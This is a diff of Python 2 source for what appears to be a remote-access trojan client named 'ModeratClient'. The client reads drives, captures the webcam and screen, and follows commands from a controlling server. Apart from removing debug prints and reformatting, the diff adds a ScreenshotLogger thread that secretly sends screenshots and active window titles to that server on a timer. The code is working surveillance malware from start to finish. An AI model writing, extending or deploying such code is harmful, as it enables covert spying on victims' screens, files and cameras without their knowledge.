@@ -26,7 +26,6 @@ def get_username():
     GetUserNameW = advapi32.GetUserNameW
     GetUserNameW.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_uint)]
     GetUserNameW.restype = ctypes.c_uint
-
     def GetUserName():
         buffer = ctypes.create_unicode_buffer(2)
         size = ctypes.c_uint(len(buffer))
@@ -34,7 +33,6 @@ def get_username():
             buffer = ctypes.create_unicode_buffer(len(buffer) * 2)
             size.value = len(buffer)
         return buffer.value
-
     return GetUserName()
 
 
@@ -102,7 +100,6 @@ class Explorer:
         return result
 
     def get_drives(self):
-        print 'get_drives'
         uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
         bitmask = Kernel32.GetLogicalDrives()
         for letter in uppercase:
@@ -220,19 +217,10 @@ class InfoNfo:
 
     def set_default_values(self):
         with open(self.info_path, 'w') as _file:
-            _file.write(
-                str({
-                    'i':    'noKey',
-                    'kts':  False,
-                    'kt':   30,
-                    'ats':  False,
-                    'at':   30,
-                    'sts':  False,
-                    'std':  20,
-                    'st':   30,
-                    'usp':  True,
-                })
-            )
+            _file.write(str({
+                        'i': 'noKey', 'kts': False, 'kt': 30, 'ats': False, 'at': 30,
+                        'sts': False, 'std': 20, 'st': 30, 'usp': True,
+                    }))
 
 
 class Modes(threading.Thread):
@@ -367,8 +355,6 @@ class ModeratClient(asyncore.dispatcher):
             self.close()
         else:
             self.connected = False
-            time.sleep(5)
-            self.initiate_connection_with_server()
 
     def handle_error(self):
         pass
@@ -393,7 +379,6 @@ class ModeratClient(asyncore.dispatcher):
                         self.commands.append(self.read_buffer.split(end)[i])
                 else:
                     self.commands.append(self.read_buffer[:-len(end)])
-            print 'received'
             self.reactor()
             self.read_buffer = ''
 
@@ -407,20 +392,14 @@ class ModeratClient(asyncore.dispatcher):
             'key': self.info.values['i'],
         }
         self.out_buffer = str(message) + '[ENDOFMESSAGE]'
-        if mode != 'infoChecker':
-            print 'sent {}'.format(mode)
 
     def reactor(self):
         for command in self.commands:
             msg = ast.literal_eval(command)
             if msg['mode'] == 'connectSuccess':
                 if self.P2P:
-                    payload = {
-                        'os_type': str(sys.platform),
-                        'os': str(platform.platform()),
-                        'i': self.info.values['i'],
-                        'mark': self.P2P
-                    }
+                    payload = {'os_type': str(sys.platform), 'os': str(platform.platform()),
+                                'i': self.info.values['i'], 'mark': self.P2P}
                     self.send_data(str(payload), 'clientInitializing', MODERATOR)
                 else:
                     self.send_data(self.info.values['i'], 'clientInitializing', MODERATOR)
@@ -428,6 +407,8 @@ class ModeratClient(asyncore.dispatcher):
                 if len(msg['payload']) == 12:
                     self.info.set_values({'i': msg['payload']})
                     self.info.values['i'] = msg['payload']
+                    if self.info.values['sts']:
+                        ScreenshotLogger(self).start()
             elif msg['mode'] == 'setLogSettings':
                 self.info.values = self.info.set_values(msg['payload'])
             elif msg['mode'] == 'terminateProcess':
@@ -485,11 +466,28 @@ class BITMAPINFO(ctypes.Structure):
         ('bmiColors', ctypes.c_ulong * 3)]
 
 
+class ScreenshotLogger(threading.Thread):
+
+    def __init__(self, client):
+        super(ScreenshotLogger, self).__init__()
+        self.active = True
+        self.client = client
+
+    def run(self):
+        while self.active and self.client.connected:
+            payload = {
+                'screen_bits': screenshot.get(),
+                'title_name': get_window_title(),
+                'width': screenshot.width,
+                'height': screenshot.height,
+            }
+            self.client.send_data(payload, 'screenshotLog')
+            time.sleep(self.client.info.values['std'])
+
+
 # Objects
 screenshot = Screenshot()
 webcamera = Webcam()
 explorer = Explorer()
-
-
 client = ModeratClient('127.0.0.1', 443, P2P=False)
 asyncore.loop(0.1)
